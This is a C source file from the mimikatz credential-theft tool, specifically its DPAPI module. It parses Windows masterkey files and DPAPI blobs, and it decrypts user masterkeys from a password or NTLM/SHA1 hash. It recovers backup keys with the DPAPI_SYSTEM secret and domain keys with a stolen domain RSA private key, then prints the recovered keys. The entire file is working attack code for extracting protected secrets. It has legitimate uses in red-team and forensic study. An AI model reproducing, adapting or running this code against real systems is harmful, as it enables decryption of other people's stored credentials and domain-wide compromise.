/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_dpapi.h"

const KUHL_M_C kuhl_m_c_dpapi[] = {
	{kuhl_m_dpapi_masterkeys,	L"masterkeys",	L"Describe a Masterkeys file"},
	{kuhl_m_dpapi_blob,			L"blob",		L"Describe a DPAPI blob (secret)"},
	{kuhl_m_dpapi_protect,		L"protect",		L"Protect a data via a DPAPI call"},
	{kuhl_m_dpapi_unprotect,	L"unprotect",	L"Unprotect a data via DPAPI call or with a Masterkey/its SHA1"},
	{kuhl_m_dpapi_masterkey,	L"masterkey",	L"Unprotect each Masterkey in a Masterkeys file (key depending)"},
	{kuhl_m_dpapi_keys_test,	L"test",		L"Test"},
};
const KUHL_M kuhl_m_dpapi = {
	L"dpapi",	L"", NULL,
	ARRAYSIZE(kuhl_m_c_dpapi), kuhl_m_c_dpapi, NULL, NULL
};

NTSTATUS kuhl_m_dpapi_masterkeys(int argc, wchar_t * argv[])
{
	PKULL_M_DPAPI_MASTERKEYS masterkeys;
	PBYTE buffer;
	DWORD szBuffer;

	if(argc && kull_m_file_readData(argv[0], &buffer, &szBuffer))
	{
		if(masterkeys = kull_m_dpapi_masterkeys_create(buffer))
		{
			kull_m_dpapi_masterkeys_descr(masterkeys);
			kull_m_dpapi_masterkeys_delete(masterkeys);
		}
		LocalFree(buffer);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_blob(int argc, wchar_t * argv[])
{
	PKULL_M_DPAPI_BLOB blob;
	PBYTE buffer;
	DWORD szBuffer;

	if(argc && kull_m_file_readData(argv[0], &buffer, &szBuffer))
	{
		if(blob = kull_m_dpapi_blob_create(buffer))
		{
			kull_m_dpapi_blob_descr(blob);
			kull_m_dpapi_blob_delete(blob);
		}
		LocalFree(buffer);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_protect(int argc, wchar_t * argv[])
{
	DATA_BLOB dataIn, dataOut, dataEntropy = {0, NULL};
	PKULL_M_DPAPI_BLOB blob;
	PCWSTR description = NULL, szEntropy, outfile;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, MIMIKATZ}, *pPrompt;
	DWORD flags = 0, outputMode = 1;

	kull_m_string_args_byName(argc, argv, L"data", (PCWSTR *) &dataIn.pbData, MIMIKATZ);
	kull_m_string_args_byName(argc, argv, L"description", &description, NULL);
	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &dataEntropy.pbData, &dataEntropy.cbData);
	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;
	
	if(kull_m_string_args_byName(argc, argv, L"c", NULL, NULL))
		outputMode = 2;

	kprintf(L"\ndata        : %s\n", dataIn.pbData);
	kprintf(L"description : %s\n", description ? description : L"");
	kprintf(L"flags       : "); kull_m_dpapi_displayProtectionFlags(flags); kprintf(L"\n");
	kprintf(L"prompt flags: "); if(pPrompt) kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags); kprintf(L"\n");
	kprintf(L"entropy     : "); kull_m_string_wprintf_hex(dataEntropy.pbData, dataEntropy.cbData, 0); kprintf(L"\n\n");

	dataIn.cbData = (DWORD) ((wcslen((PCWSTR) dataIn.pbData) + 1) * sizeof(wchar_t));
	if(CryptProtectData(&dataIn, description, &dataEntropy, NULL, pPrompt, flags, &dataOut))
	{
		if(blob = kull_m_dpapi_blob_create(dataOut.pbData))
		{
			kull_m_dpapi_blob_descr(blob);
			kull_m_dpapi_blob_delete(blob);
		}
		kprintf(L"\n");
		if(kull_m_string_args_byName(argc, argv, L"out", &outfile, NULL))
		{
			if(kull_m_file_writeData(outfile, dataOut.pbData, dataOut.cbData))
				kprintf(L"Write to file \'%s\' is OK\n", outfile);
		}
		else
		{
			kprintf(L"Blob:\n");
			kull_m_string_wprintf_hex(dataOut.pbData, dataOut.cbData, outputMode | (16 << 16));
			kprintf(L"\n");
		}
		LocalFree(dataOut.pbData);
	}
	else PRINT_ERROR_AUTO(L"CryptProtectData");

	if(dataEntropy.pbData)
		LocalFree(dataEntropy.pbData);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_unprotect(int argc, wchar_t * argv[])
{
	DATA_BLOB dataIn, dataOut, dataEntropy = {0, NULL};
	PKULL_M_DPAPI_BLOB blob;
	PCWSTR szEntropy, outfile, infile, szMasterkey, szPassword = NULL;
	PWSTR description = NULL;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, MIMIKATZ}, *pPrompt;
	DWORD flags = 0;
	UNICODE_STRING uString;

	BOOL statusDecrypt = FALSE;
	PBYTE masterkey = NULL;
	DWORD masterkeyLen = 0;

	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &dataEntropy.pbData, &dataEntropy.cbData);
	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;
	if(kull_m_string_args_byName(argc, argv, L"masterkey", &szMasterkey, NULL))
		kull_m_string_stringToHexBuffer(szMasterkey, &masterkey, &masterkeyLen);
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);

	kprintf(L"\nflags       : "); kull_m_dpapi_displayProtectionFlags(flags); kprintf(L"\n");
	kprintf(L"prompt flags: "); if(pPrompt) kull_m_dpapi_displayPromptFlags(pPrompt->dwPromptFlags); kprintf(L"\n");
	kprintf(L"entropy     : "); kull_m_string_wprintf_hex(dataEntropy.pbData, dataEntropy.cbData, 0); kprintf(L"\n");
	kprintf(L"masterkey   : "); kull_m_string_wprintf_hex(masterkey, masterkeyLen, 0); kprintf(L"\n");
	kprintf(L"password    : %s\n\n", szPassword ? szPassword : L"");

	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(kull_m_file_readData(infile, &dataIn.pbData, &dataIn.cbData))
		{
			if(blob = kull_m_dpapi_blob_create(dataIn.pbData))
			{
				kull_m_dpapi_blob_descr(blob);

				if(masterkey && masterkeyLen)
					statusDecrypt = kull_m_dpapi_unprotect_blob(blob, masterkey, masterkeyLen, dataEntropy.pbData, dataEntropy.cbData, szPassword, (LPVOID *) &dataOut.pbData, &dataOut.cbData);
				else
					statusDecrypt = CryptUnprotectData(&dataIn, &description, &dataEntropy, NULL, pPrompt, 0, &dataOut);

				if(statusDecrypt)
				{
					if(description)
					{
						kprintf(L"description : %s\n", description);
						LocalFree(description);
					}

					if(kull_m_string_args_byName(argc, argv, L"out", &outfile, NULL))
					{
						if(kull_m_file_writeData(outfile, dataOut.pbData, dataOut.cbData))
							kprintf(L"Write to file \'%s\' is OK\n", outfile);
					}
					else
					{
						uString.Length = uString.MaximumLength = (USHORT) dataOut.cbData;
						uString.Buffer = (PWSTR) dataOut.pbData;
						kprintf(L"data - ");
						if((uString.Length <= USHRT_MAX) && (kull_m_string_suspectUnicodeString(&uString)))
							kprintf(L"text : %s", dataOut.pbData);
						else
						{
							kprintf(L"hex  : ");
							kull_m_string_wprintf_hex(dataOut.pbData, dataOut.cbData, 1 | (16 << 16));
						}
						kprintf(L"\n");
					}
					LocalFree(dataOut.pbData);
				}
				else if(!masterkey) PRINT_ERROR_AUTO(L"CryptUnprotectData");

				kull_m_dpapi_blob_delete(blob);
			}
			LocalFree(dataIn.pbData);
		}
	}

	if(dataEntropy.pbData)
		LocalFree(dataEntropy.pbData);

	if(masterkey)
		LocalFree(masterkey);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dpapi_masterkey(int argc, wchar_t * argv[])
{
	PKULL_M_DPAPI_MASTERKEYS masterkeys;
	PBYTE buffer;
	PPVK_FILE_HDR pvkBuffer;
	DWORD szBuffer, szPvkBuffer;

	LPCWSTR szIn = NULL, szSid = NULL, szPassword = NULL, szHash = NULL, szSystem = NULL, szDomainpvk = NULL;
	BOOL isProtected = kull_m_string_args_byName(argc, argv, L"protected", NULL, NULL);
	PWSTR convertedSid = NULL;
	PSID pSid;

	PBYTE pHash = NULL, pSystem = NULL;
	DWORD cbHash = 0, cbSystem = 0;

	PVOID output;
	DWORD cbOutput;

	if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
	{
		kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL);
		kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
		kull_m_string_args_byName(argc, argv, L"hash", &szHash, NULL);
		kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL);
		kull_m_string_args_byName(argc, argv, L"domainpvk", &szDomainpvk, NULL);

		if(kull_m_file_readData(szIn, &buffer, &szBuffer))
		{
			if(masterkeys = kull_m_dpapi_masterkeys_create(buffer))
			{
				//kull_m_dpapi_masterkeys_descr(masterkeys);
				if(szSid)
				{
					if(ConvertStringSidToSid(szSid, &pSid))
					{
						ConvertSidToStringSid(pSid, &convertedSid);
						LocalFree(pSid);
					}
					else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
				}
				if(szHash)
					kull_m_string_stringToHexBuffer(szHash, &pHash, &cbHash);
				if(szSystem)
					kull_m_string_stringToHexBuffer(szSystem, &pSystem, &cbSystem);

				if(convertedSid)
				{
					if(masterkeys->MasterKey && masterkeys->dwMasterKeyLen)
					{
						if(szPassword)
						{
							kprintf(L"\n[masterkey] with password: %s (%s user)\n", szPassword, isProtected ? L"protected" : L"normal");
							if(kull_m_dpapi_unprotect_masterkey_with_password(masterkeys->dwFlags, masterkeys->MasterKey, szPassword, convertedSid, isProtected, &output, &cbOutput))
								kuhl_m_dpapi_displayInfosAndFree(output, cbOutput, NULL);
							else PRINT_ERROR(L"kull_m_dpapi_unprotect_masterkey_with_password\n");
						}
						if(pHash)
						{
							kprintf(L"\n[masterkey] with hash: "); kull_m_string_wprintf_hex(pHash, cbHash, 0);
							if(cbHash == LM_NTLM_HASH_LENGTH)
								kprintf(L" (ntlm type)\n");
							else if(cbHash == SHA_DIGEST_LENGTH)
								kprintf(L" (sha1 type)\n");
							else 
								kprintf(L" (?)\n");

							if(kull_m_dpapi_unprotect_masterkey_with_userHash(masterkeys->MasterKey, pHash, cbHash, convertedSid, &output, &cbOutput))
								kuhl_m_dpapi_displayInfosAndFree(output, cbOutput, NULL);
							else PRINT_ERROR(L"kull_m_dpapi_unprotect_masterkey_with_userHash\n");
						}
					}
					if(masterkeys->BackupKey && masterkeys->dwBackupKeyLen)
					{
						if(!(masterkeys->dwFlags & 1) || (pSystem && cbSystem))
						{
							kprintf(L"\n[backupkey] %s DPAPI_SYSTEM: ", pSystem ? L"with" : L"without");
							if(pSystem)
								kull_m_string_wprintf_hex(pSystem, cbSystem, 0);
							kprintf(L"\n");

							if(kull_m_dpapi_unprotect_backupkey_with_secret(masterkeys->dwFlags, masterkeys->BackupKey, convertedSid, pSystem, cbSystem, &output, &cbOutput))
								kuhl_m_dpapi_displayInfosAndFree(output, cbOutput, NULL);
							else PRINT_ERROR(L"kull_m_dpapi_unprotect_backupkey_with_secret\n");
						}
					}
					LocalFree(convertedSid);
				}

				if(pHash)
					LocalFree(pHash);
				if(pSystem)
					LocalFree(pSystem);

				if(szDomainpvk && masterkeys->DomainKey && masterkeys->dwDomainKeyLen)
				{
					kprintf(L"\n[domainkey] with RSA private key\n");
					if(kull_m_file_readData(szDomainpvk, (PBYTE *) &pvkBuffer, &szPvkBuffer))
					{
						if(kull_m_dpapi_unprotect_domainkey_with_key(masterkeys->DomainKey, (PBYTE) pvkBuffer + sizeof(PVK_FILE_HDR), pvkBuffer->cbPvk, &output, &cbOutput, &pSid))
							kuhl_m_dpapi_displayInfosAndFree(output, cbOutput, pSid);
						else PRINT_ERROR(L"kull_m_dpapi_unprotect_domainkey_with_key\n");
						LocalFree(pvkBuffer);
					}
				}
				kull_m_dpapi_masterkeys_delete(masterkeys);
			}
			LocalFree(buffer);
		}
	}
	else PRINT_ERROR(L"Input masterkeys file needed (/in:file)\n");
	return STATUS_SUCCESS;
}

void kuhl_m_dpapi_displayInfosAndFree(PVOID data, DWORD dataLen, PSID sid)
{
	BYTE digest[SHA_DIGEST_LENGTH];
	
	kprintf(L"  key : ");
	kull_m_string_wprintf_hex(data, dataLen, 0);
	kprintf(L"\n");

	if(kull_m_crypto_hash(CALG_SHA1, data, dataLen, digest, sizeof(digest)))
	{
		kprintf(L"  sha1: ");
		kull_m_string_wprintf_hex(digest, sizeof(digest), 0);
		kprintf(L"\n");
	}
	LocalFree(data);
	
	if(sid)
	{
		kprintf(L"  sid : ");
		kull_m_string_displaySID(sid);
		kprintf(L"\n");
		LocalFree(sid);
	}
}